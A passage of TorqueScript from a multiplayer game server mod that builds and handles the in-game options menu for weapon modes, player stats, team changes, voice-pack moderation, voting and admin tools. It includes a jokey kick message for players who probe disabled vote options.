		Client::addMenuItem(%clientId, %curItem++ @ "Particle Beam", "weapon_pbeam");
		
		Client::addMenuItem(%clientId, %curItem++ @ "Suicide Pack", "pack_suicideTimer");
		if(%clientId.weaponHelp == true)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Weapon Help", "weaponHelp");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Weapon Help", "weaponHelp");
		
		if(%clientId.BlockMySound == true)
			Client::addMenuItem(%clientId, %curItem++ @ "Turn voice pack on", "BlockMySound");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Turn voice pack off", "BlockMySound");
		
		if(!%clientId.TitanRotation)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable New Titan Rotation", "weaponrot");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Old Titan Rotation", "weaponrot");
		
//		if(!%clientId.DuelToggle) 
//			Client::addMenuItem(%clientId, %curItem++ @ "Enable Duels", "dueltoggle");
//		else
//			Client::addMenuItem(%clientId, %curItem++ @ "Disable Duels", "dueltoggle");
				
		if(%clientId.isadmin)
		{
			if(%clientId.isGoated || $ANNIHILATION::HideAdmin)
			{
				if(%clientId.SecretAdmin == true)
					Client::addMenuItem(%clientId, %curItem++ @ "Disable Secret Admin", "RegularAdmin");
				else
					Client::addMenuItem(%clientId, %curItem++ @ "Enable Secret Admin", "SecretAdmin");
			}
		}
		return;
				
	}
	if(%clientId.isadmin)
	{
		if(%opt == "SecretAdmin" && (%clientId.isSuperAdmin || $ANNIHILATION::HideAdmin))
		{
			Client::sendMessage(%clientId, 1, "Secret admin mode engaged~wturreton1.wav");		
			%clientId.SecretAdmin = true;		
			centerprint(%clientId, "<jc><f2>Secret <f1>admin <f2>mode engaged.", 10);
			return;
		}	
		else if(%opt == "RegularAdmin" && (%clientId.isSuperAdmin || $ANNIHILATION::HideAdmin))
		{
			Client::sendMessage(%clientId, 1, "Regular admin mode engaged~wturreton1.wav");		
			%clientId.SecretAdmin = false;		
			centerprint(%clientId, "<jc><f2>Regular <f1>admin <f2>mode engaged.", 10);
			return;
		}		
		
		
		
	}
	
	if(%opt == "flair")
	{
		if(%clientId.PPIsRegistered)
		{
			TA::FlairShop(%clientId);
			return;
		}
		else
		{
			Client::sendMessage(%clientId, 2, "This account is not registred.");
			return;
		}
	}
	
	if(%opt == "stat")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(!%clientId.PPIsRegistered)
		{
			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			Client::sendMessage(%clientId, 1, "This account is not registred. Type #help in chat to register a new account.");

			Centerprint(%clientId,"<jc><f0>Player Stats:\n\n  <f2> Player Stats can be saved for your player name by creating a password for this player name. \n\n <f2> Type <f0>#help<f2> in chat to register a new account.",15);
			return;
		}
		
		if(%cl == "records" || %cl == "objective" || %cl == "combat" || %cl == "misc")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			DisplayStats(%clientId,%cl);
		}
		else if(%cl == "back")
		{
			Game::menuRequest(%clientId);
		}
		else {
			%curItem = 0;
			Client::buildMenu(%clientId, "Personal Statistics", "options", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Records Stats", "stat records"); // Personal Records
			Client::addMenuItem(%clientId, %curItem++ @ "Objective Stats", "stat objective"); // Objective Stats
			Client::addMenuItem(%clientId, %curItem++ @ "Combat Stats", "stat combat"); // Combat Stats
			Client::addMenuItem(%clientId, %curItem++ @ "Misc Stats", "stat misc"); // Misc Stats
			Client::addMenuItem(%clientId, %curItem++ @ "Back...", "stat back");
		}
		return;
	}
	
	if (%opt == "weapon_grenadelauncher")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%curItem = 0;
		Client::buildMenu(%clientId, "Mini Bomber Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Single Grenade", "weapon_grenadelauncher_single");
		Client::addMenuItem(%clientId, %curItem++ @ "Triple Grenades", "weapon_grenadelauncher_triple");
		Client::addMenuItem(%clientId, %curItem++ @ "EMP Grenade", "weapon_grenadelauncher_emp");
		//Client::addMenuItem(%clientId, %curItem++ @ "Mine dropper", "weapon_grenadelauncher_mine"); //removed mine nades
		//Client::addMenuItem(%clientId, %curItem++ @ "Starburst Mines", "weapon_grenadelauncher_star");		
		return;
	}
	else if (%opt == "weapon_grenadelauncher_single")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");		
		%clientId.MiniMode = 1;		
		schedule("bottomprint(" @ %clientId @ ", \"<jc>Mini Bomber: <f2>Single Grenade Projectile mode engaged.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0.01,%clientId);
		return;
	}
	else if (%opt == "weapon_grenadelauncher_triple")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");		
		%clientId.MiniMode = 0;		
		schedule("bottomprint(" @ %clientId @ ", \"<jc>Mini Bomber: <f2>Tripple Grenade Projectile.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0.01,%clientId);
		return;
	}
	else if (%opt == "weapon_grenadelauncher_emp")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");
		%clientId.MiniMode = 2;		
		schedule("bottomprint(" @ %clientId @ ", \"<jc>Mini Bomber: <f2>EMP <f2>Grenade Projectile.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0.01,%clientId);
		return;
	}
	//else if (%opt == "weapon_grenadelauncher_mine") //removed mine nades
	//{
	//	Client::sendMessage(%clientId, 0, "~wturreton1.wav");
	//	%clientId.MiniMode = 2;		
	//	schedule("bottomprint(" @ %clientId @ ", \"<jc>Mini Bomber: <f2>Mine Dropper Projectile.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0.01,%clientId);
	//	return;
	//}
	//else if (%opt == "weapon_grenadelauncher_star")
	//{
	//	Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
	//	%clientId.MiniMode = 3;		
	//	schedule("bottomprint(" @ %clientId @ ", \"<jc>Mini Bomber: <f2>Starburst Mine Projectile.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0.01,%clientId);
	//	return;
	//}	
	else if (%opt == "weapon_vulcan")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");		
		%curItem = 0;
		Client::buildMenu(%clientId, "Vulcan Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Chaingun Bullets", "weapon_vulcan_chg");
		Client::addMenuItem(%clientId, %curItem++ @ "Vulcan Bullets", "weapon_vulcan_vul");
		return;
	}
	else if (%opt == "weapon_vulcan_chg")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
		%clientId.Vulcan = 0;
		schedule("bottomprint(" @ %clientId @ ", \"<jc>Vulcan:<f2> Standard Chaingun Rounds.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0.01,%clientId);
		return;
	}
	else if (%opt == "weapon_vulcan_vul")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");		
		%clientId.Vulcan = 1;
		schedule("bottomprint(" @ %clientId @ ", \"<jc>Vulcan:<f2> Fiery Vulcan Rounds.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0.01,%clientId);
		return;
	}
	else if (%opt == "pack_suicideTimer")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%curItem = 0;
		Client::buildMenu(%clientId, "Suicide Pack Timer", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Instant", "pack_suicideTimer_0");
		Client::addMenuItem(%clientId, %curItem++ @ "5 sec", "pack_suicideTimer_5");
		Client::addMenuItem(%clientId, %curItem++ @ "10 sec (Default)", "pack_suicideTimer_10");
		Client::addMenuItem(%clientId, %curItem++ @ "15 sec", "pack_suicideTimer_15");
		Client::addMenuItem(%clientId, %curItem++ @ "20 sec", "pack_suicideTimer_20");
		return;
	}
	else if (%opt == "pack_suicideTimer_0")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
		%clientId.suicideTimer = 0;
		schedule("bottomprint(" @ %clientId @ ", \"<jc><f2>Suicide Pack Timer Set to detonate <f1>INSTANTLY\", 7);", 0.01,%clientId);
		return;
	}
	else if (%opt == "pack_suicideTimer_5")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
		%clientId.suicideTimer = 5;
		schedule("bottomprint(" @ %clientId @ ", \"<jc><f2>Suicide Pack Timer Set to <f1>5 <f2>seconds\", 7);", 0.01,%clientId);
		return;
	}
	else if (%opt == "pack_suicideTimer_10")
	{	
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
		%clientId.suicideTimer = 10;
		schedule("bottomprint(" @ %clientId @ ", \"<jc><f2>Suicide Pack Timer Set to <f1>10 <f2>seconds\", 7);", 0.01,%clientId);
		return;
	}
	else if (%opt == "pack_suicideTimer_15")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
		%clientId.suicideTimer = 15;
		schedule("bottomprint(" @ %clientId @ ", \"<jc><f2>Suicide Pack Timer Set to <f1>15 <f2>seconds\", 7);", 0.01,%clientId);
		return;
	}
	else if (%opt == "pack_suicideTimer_20")
	{
		Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
		%clientId.suicideTimer = 20;
		schedule("bottomprint(" @ %clientId @ ", \"<jc><f2>Suicide Pack Timer Set to <f1>20 <f2>seconds\", 7);", 0.01,%clientId);
		return;
	}
	else if(%opt == "weapon_pbeam")
	{	
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		%curItem = 0;
		Client::buildMenu(%clientId, "Particle Beam Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Standard Firing", "weapon_pbeam_old");
		Client::addMenuItem(%clientId, %curItem++ @ "Charge Firing", "weapon_pbeam_new");
		return;
	}	
	else if(%opt == "weapon_pbeam_old")
	{
		if(player::getitemcount(%clientId,ParticleBeamWeapon) == 1)
		{
			%weapon = Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot);		
			if(%clientId.pbeam != 0 && %clientId.pbeam != "" && %weapon == ParticleBeamWeapon)
			{
				schedule("bottomprint(" @ %clientId @ ", \"<jc>Particle Beam Weapon: <f2>Standard Neutron Beam.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 7);", 0);
			}
		}
		else
			Client::sendMessage(%clientId, 0, "Particle Beam preference switched to standard mode.~wturreton1.wav");
		
		%clientId.pbeam = 0;
		return;
	}
	else if(%opt == "weapon_pbeam_new")
	{			
		%weapon = Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot);
		if(player::getitemcount(%clientId,ParticleBeamWeapon) == 1)
		{
			if(%weapon == ParticleBeamWeapon)
			{
				bottomprint(%clientId,"<jc>Particle Beam Weapon: <f2>Enhanced Positron Beam. Hold fire to charge.\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.",10);
				Client::sendMessage(%clientId, 0, "Particle Beam switched to enhanced mode~wturreton1.wav");
			}
			else
				Client::sendMessage(%clientId, 0, "Particle Beam preference switched to enhanced mode.~wturreton1.wav");
		}
		else
			Client::sendMessage(%clientId, 0, "Particle Beam preference switched to enhanced mode.~wturreton1.wav");

		%clientId.pbeam = 1;
		return;
	}
	// END Weapon Options	
	else if(%opt == "weaponHelp")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(%clientId.weaponHelp == true)
		{
			%clientId.weaponHelp = false;
			Client::sendMessage(%clientId,0,"Weapon Help Disabled.");
			centerprint(%clientId, "<jc><f1>Weapon Help Disabled.", 2);	
			return;
		}	
		else
		{
			%clientId.weaponHelp = true;
			Client::sendMessage(%clientId,0,"Weapon Help Enabled.");
			centerprint(%clientId, "<jc><f1>Weapon Help Enabled.", 2);			
			return;
		}
	}	
	//	
	else if(%opt == "BlockMySound")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(%clientId.BlockMySound == true)
		{
			%clientId.BlockMySound = false;
			Client::sendMessage(%clientId,0,"Voice pack Enabled.");
			centerprint(%clientId, "<jc><f1>Voice pack Enabled.", 2);	
			return;
		}	
		else
		{
			%clientId.BlockMySound = true;
			Client::sendMessage(%clientId,0,"Voice pack Disabled.");
			centerprint(%clientId, "<jc><f1>Voice pack Disabled.", 2);			
			return;
		}
	}
	else if(%opt == "weaponrot")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(%clientId.TitanRotation == true)
		{
			%clientId.TitanRotation = false;
			Client::sendMessage(%clientId,0,"Old Titan Weapon Rotation Enabled.");
			centerprint(%clientId, "<jc><f1>Old Titan Weapon Rotation Enabled.", 2);	
			return;
		}	
		else
		{
			%clientId.TitanRotation = true;
			Client::sendMessage(%clientId,0,"New Titan Weapon Rotation Enabled.");
			centerprint(%clientId, "<jc><f1>New Titan Weapon Rotation Enabled.", 2);			
			return;
		}
	}
	else if(%opt == "dueltoggle")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(%clientId.DuelToggle == true)
		{
			%clientId.DuelToggle = false;
			Client::sendMessage(%clientId,0,"Duels have been Disabled.");
			centerprint(%clientId, "<jc><f1>Duels have been Disabled.", 2);	
			return;
		}	
		else
		{
			%clientId.DuelToggle = true;
			Client::sendMessage(%clientId,0,"Duels have been Enabled.");
			centerprint(%clientId, "<jc><f1>Duels have been Enabled.", 2);			
			return;
		}
	}
		
	// END Weapon/ personal Options
	
	if(%opt == "changeteams")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%now = getSimTime(); //AFK System
		%clientId.lastActiveTimestamp = %now; //AFK System 
		if(%clientId.locked)
		{
			Client::sendMessage(%clientId,0,"You cannot change teams, that privilege been revoked.");
			centerprint(%clientId, "<jc><f1>You don't have team changing privileges.", 15);			
			return;
		}
		%player = Client::getOwnedObject(%clientId);
		if(%player.frozen == true || $jailed[%player] == true)
		{
			if(%clientId.isGoated)
			{
				Client::buildMenu(%clientId, "Escape from jail? (Wanker!)", "PickTeam", true);
				Client::addMenuItem(%clientId, "1yes", "escape");
				Client::addMenuItem(%clientId, "2no", "noper");	
				return;
			}
			else
			{
				client::sendmessage(%clientId,2,"WARDEN: Not on my watch son...");
				return;
			}			
		}		
		if(!$matchStarted || !$Server::TourneyMode)
		{
			%teamnow = Client::getTeam(%clientId);

			%tname = getTeamName(%teamnow);
						if (%tname == unnamed) 
							%tname = "Observer";
			Client::buildMenu(%clientId, "Change from "@ %tname @" team", "PickTeam", true);
			if(Client::getTeam(%clientId) != -1) 
				Client::addMenuItem(%clientId, "0Observer", -2);
			if(Game::assignClientTeam(%clientId,true) != %teamnow)	
				Client::addMenuItem(%clientId, "1Automatic", -1);
			if(!$ANNIHILATION::FairTeams || %clientId.isAdmin)
			{	
				for(%i = 0; %i < getNumTeams()-1; %i = %i + 1)
				{
					if(Client::getTeam(%clientId) != %i)
						Client::addMenuItem(%clientId, (%i+2) @ getTeamName(%i), %i);
				 			}
				 		}
			return;
		}
	}
// voice
	if (%opt == "voice" && %clientId.isadmin) 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		%curItem = 0;
		%name = client::getname(%cl);
		Client::buildMenu(%clientId, "Modify "@%name@"'s Voice", "options", true);
		if(%clientId.muted[%cl])
			Client::addMenuItem(%clientId, %curItem++ @ "Unmute " @ %name, "unmute " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Ignore " @ %name, "mute " @ %cl);

		if(%clientId.isGoated || %clientId.isOwner)
		{			
		if(%cl.silenced)
			Client::addMenuItem(%clientId, %curItem++ @ "Global unmute", "unsilence " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Global mute ", "silence " @ %cl);
		}

			if(%clientId.isGoated)
			{			
		if(%cl.leet)
			Client::addMenuItem(%clientId, %curItem++ @ "D-1ee7 " @ %name, "dleet " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Leetify " @ %name, "leet " @ %cl);
			}

			if(%clientId.isGoated || %clientId.isSuperAdmin)
		{
		if(%cl.noVpack)
			Client::addMenuItem(%clientId, %curItem++ @ "Return voice pack " @ %name, "ReturnVoicePack " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Take voice pack" , "TakeVoicePack " @ %cl);
			
		if(%cl.noKpack)
			Client::addMenuItem(%clientId, %curItem++ @ "Return Kpack " @ %name, "ReturnKPack " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Take Kpack" , "TakeKPack " @ %cl);		
		}
		return;
	}
		
	// voice modifiers
	 	if(%opt == "silence" && %clientId.isadmin)			
		Admin::fun(%clientId, %cl,"De-Tongued");	
	 	if(%opt == "unsilence" && %clientId.isadmin)			
		Admin::fun(%clientId, %cl,"Un-Muted");	
			
	 	if(%opt == "leet" && %clientId.isadmin)
	 	{
	 		logAdminAction(%clientId," leeted " @ Client::getName(%cl));			
		%cl.leet = true;
	}	
	 	if(%opt == "dleet" && %clientId.isadmin) 
	 	{ 	
	 		%cl.leet = "";
	 		logAdminAction(%clientId," d-leeted " @ %name ); 
		Client::sendMessage(%cl,0,"You are no longer 1337.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" removed your 1337ness, get over it.");	
		
	}
	//voice packs	
	if(%opt == "TakeVoicePack" && %clientId.isadmin) 
	{ 
	if(%cl.isGoated && %clientId != %cl)
	{
	return;
	}
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
	 		logAdminAction(%clientId," removed " @ Client::getName(%cl) @"'s voice pack"); 
	 		%cl.noVpack = true;
		Client::sendMessage(%cl,0,"Your voice pack has been disabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" removed your voice pack.");	
		
	}
	if(%opt == "ReturnVoicePack" && %clientId.isadmin) 
	 { 	
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
	 		logAdminAction(%clientId," returned " @ Client::getName(%cl) @"'s voice pack");
	 		%cl.noVpack = "";
		Client::sendMessage(%cl,0,"Your voice pack has been reenabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" returned your voice pack, please be responsible with it.");	
		
	}	
	
	if(%opt == "TakeKPack" && %clientId.isadmin) 
	{ 
	if(%cl.isGoated && %clientId != %cl)
	{
	return;
	}
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
	 	logAdminAction(%clientId," removed " @ Client::getName(%cl) @"'s Kpack"); 
	 	%cl.noKpack = true;
		Client::sendMessage(%cl,0,"Your Kpack has been disabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" removed your Kpack.");	
		
	}
	if(%opt == "ReturnKPack" && %clientId.isadmin) 
	 { 	
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
	 	logAdminAction(%clientId," returned " @ Client::getName(%cl) @"'s Kpack");
	 	%cl.noKpack = "";
		Client::sendMessage(%cl,0,"Your Kpack has been reenabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" returned your Kpack, please be responsible with it.");	
		
	}
		
	else if(%opt == "mute")
	{
 		Client::sendMessage(%clientId, 0, "You are no longer listening to "@ Client::getName(%cl) @".");	
		%clientId.muted[%cl] = true;
	}
	else if(%opt == "unmute")
	{
 		Client::sendMessage(%clientId, 0, "You are listening to "@ Client::getName(%cl) @" again.");	
		%clientId.muted[%cl] = "";
	}
	else if(%opt == "vkick" && !$NoVote && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(%cl.isGoated && %clientId != %cl)
		{
			return;
		}
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "kick " @ Client::getName(%cl), "kick", %cl);
	}
	else if(%opt == "vTeamCaptin" && !$NoVote && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "give Team Captin to " @ Client::getName(%cl), "vTeamCaptin", %cl);
	}
	else if(%opt == "vDeTeamCaptin" && !$NoVote && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "strip Team Captin from " @ Client::getName(%cl), "vDeTeamCaptin", %cl);
	}
	else if(%opt == "vadmin" && !$NoVote && $ANNIHILATION::VoteAdmin && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "admin " @ Client::getName(%cl), "admin", %cl);
	}
	else if(%opt == "vfreeze"&& !$NoVote && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
//		%cl.voteTarget = true;
//		Admin::startVote(%clientId, "freeze " @ Client::getName(%cl), "freeze", %cl);
		echo("chocolatecookie.");
		admin::message(Client::getName(%clientId)@" is attempting to use tab menu exploits.");
		Net::kick(%clientId, "You have succeeded in posting your MAC addressses to a blackhat den.");
	}	
	else if(%opt == "vpoison"&& !$NoVote && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		// %cl.voteTarget = true;
		// Admin::startVote(%clientId, "poison " @ Client::getName(%cl), "poison", %cl);
		echo("chocolatecookie.");
		admin::message(Client::getName(%clientId)@" is attempting to use tab menu exploits.");
		Net::kick(%clientId, "You have succeeded in posting your MAC addressses to a blackhat den.");
	}
	else if(%opt == "vsilence"&& !$NoVote && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
//		%cl.voteTarget = true;
//		Admin::startVote(%clientId, "Detongue " @ Client::getName(%cl), "silence", %cl);
		echo("chocolatecookie.");
		admin::message(Client::getName(%clientId)@" is attempting to use tab menu exploits.");
		Net::kick(%clientId, "You have succeeded in posting your MAC addressses to a blackhat den.");
	}	
	else if(%opt == "vunsilence"&& !$NoVote && !%clientId.novote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
//		%cl.voteTarget = true;
//		Admin::startVote(%clientId, "UNMUTE " @ Client::getName(%cl), "unsilence", %cl);
		echo("chocolatecookie.");
		admin::message(Client::getName(%clientId)@" is attempting to use tab menu exploits.");
		Net::kick(%clientId, "You have succeeded in posting your MAC addressses to a blackhat den.");
	}
	else if(%opt == "vote" && !$NoVote)// && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		voteMenu(%clientId);
		return;
	}
	
	else if(%opt == "eVote" && %clientId.isadmin)	
		ServerSwitches(%clientId,"Voting",true);
	
	else if(%opt == "voteToPlayer" && !$NoVote)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		if(%cl.observerMode != "justJoined" && %cl.justConnected != true)
		{		
			voteToPlayer(%clientId, %cl);
			return;
		}
		else if($Server::TourneyMode) 
		{
			voteToPlayer(%clientId, %cl);
			return;
		}
		else
		{
			Admin::BlowUp(%clientId);
			Client::sendMessage(%clientId, 0,"You don't need to vote on "@Client::getName(%cl)@" yet, foo.");
			admin::message(Client::getName(%clientId)@" tried to start a vote on connecting player "@Client::getName(%cl)@".");
			return;	
		}
	}
	//--vtreturn
	else if(%opt == "Autoteam" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		processMenuPickTeam(%cl, -1, %clientId);		
		Game::menuRequest(%clientId);
		return;
	}
	else if(%opt == "rtdinv")//new duel code
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		ArenaTD::Invite(%clientId, %cl);
		return;
	}
	else if(%opt == "duel")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		DuelMenu(%clientId, %cl);
		return;
	}
	else if(%opt == "spawn" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		logAdminAction(%clientId," spawned " @ %name);		
		Game::playerSpawn(%cl, true);
		Game::menuRequest(%clientId);		
		return;
	}
	else if(%opt == "manage") 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		if(%clientId.isadmin || %clientId.isTeamCaptin)
		{
			PlayerManage(%clientId, %cl);
			return;
		}
	}
	//PenaltyBox	
	else if(%opt == "PenaltyBox" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		PenaltyBox(%clientId, %cl);
		return;
	}
	else if(%opt == "annoy" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		PlayerAnnoy(%clientId, %cl);
		return;
	}
//	else if(%opt == "flag" && %clientId.isadmin)
//	{	
//		PlayerFlag(%clientId, %cl);
//		return;
//	}
	else if(%opt == "Kill" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		PlayerKill(%clientId, %cl);
		return;
	}
	else if(%opt == "return")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		Game::menuRequest(%clientId);
		return;
	}
	else if(%opt == "voteForce" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		voteForce(%clientId);
		return;
	}
	else if(%opt == "adminopts" && %clientId.isadmin)
	{	
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Admin::Opts(%clientId);
		return;
	}
	else if(%opt == "adminMenu" && %clientId.isadmin)
	{	
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		adminMenu(%clientId);
		return;
	}
	else if(%opt == "vcmission" && !$NoVote)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%clientId.MissVote = true;
		Admin::changeMissionMenu(%clientId, %opt == "vcmission");
		return;
	}
	else if(%opt == "mapMenu" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		MissMenu(%clientId,true);
		return;
	}
	else if(%opt == "voteMod" && !$NoVote && $TALT::Active) 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		ModMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteMiss" && !$NoVote && $ANNIHILATION::PVChangeMission)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		MissMenu(%clientId,false);
		return;
	}
	
	else if(%opt == "voteTime" && !$NoVote)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		TimeMenu(%clientId,false);
		return;
	}
//	else if(%opt == "voteEnabling" && !$NoVote)
//	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
//		EnablingMenu(%clientId,false);
//		return;
//	}
	else if(%opt == "damageMenu" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		DamageMenu(%clientId,true);
		return;
	}
	else if(%opt == "voteDamage" && !$NoVote)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		DamageMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteFlag" && !$NoVote)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		FlagVoteMenu(%clientId,false);
		return;
	}
	else if(%opt == "votetourney" && !$NoVote)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		VoteTourney::Opts(%clientId);
		return;
	}	
	else if(%opt == "ServerOptions" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		ServerOptions(%clientId);
		return;
	}
	else if(%opt == "Equipment" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		EquipmentOptions(%clientId);
		return;
	}
	else if(%opt == "LTArmor" && %clientId.isadmin) 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		LTArmorOptions(%clientId);
		return;
	}
	else if(%opt == "tourneyopts" && %clientId.isadmin) 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Tourney::Opts(%clientId);
		return;
	}
	else if(%opt == "ArenaOptsTab")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Arena::Opts(%clientId);
		return;
	}
	else if(%opt == "ModInfo")
	{	
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%curItem = 0;
		Client::buildMenu(%clientId, WhatTime(), "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Mission Info.", "WhoMadeMe");
		if($TALT::Active == false)
			Client::addMenuItem(%clientId, %curItem++ @ "Mod Introduction.", "School");
		if($TALT::Active == false)
			Client::addMenuItem(%clientId, %curItem++ @ "Match Settings.", "school");	
		if($TA::MuteAllTourney == true && %clientId.isGod)
			Client::addMenuItem(%clientId, %curItem++ @ "Unmute all", "tmuteall"); //new for tourney mode
		else if($Server::TourneyMode && %clientId.isGod)
			Client::addMenuItem(%clientId, %curItem++ @ "Mute all but Captins and Admins", "tmuteall");
		
		return;
	}
		
	else if(%opt == "School")
	{
		%clientId.weaponHelp = "";
		%clientId.InSchool = 1;
		NewbieSchool(%clientId);			
		return;
	}
	else if(%opt == "tmuteall")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if($TA::MuteAllTourney == true)
		{
			$TA::MuteAllTourney = false;
			messageAll(0, Client::getName(%clientId) @ " has unmuted everyone.~wCapturedTower.wav");
			TA::MuteAllTourney("unmute");	
			return;
		}
		else
		{
			$TA::MuteAllTourney = true;
			messageAll(0, Client::getName(%clientId) @ " has muted everyone except Team Captins and G-Admins.~wCapturedTower.wav");
			TA::MuteAllTourney("mute");	
			return;
		}
	}	
	else if(%opt == "WhoMadeMe")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%weaponHelp = %clientId.weaponHelp;
		ModSettingsInfo(%clientId,%weaponHelp);
		return;
	}			
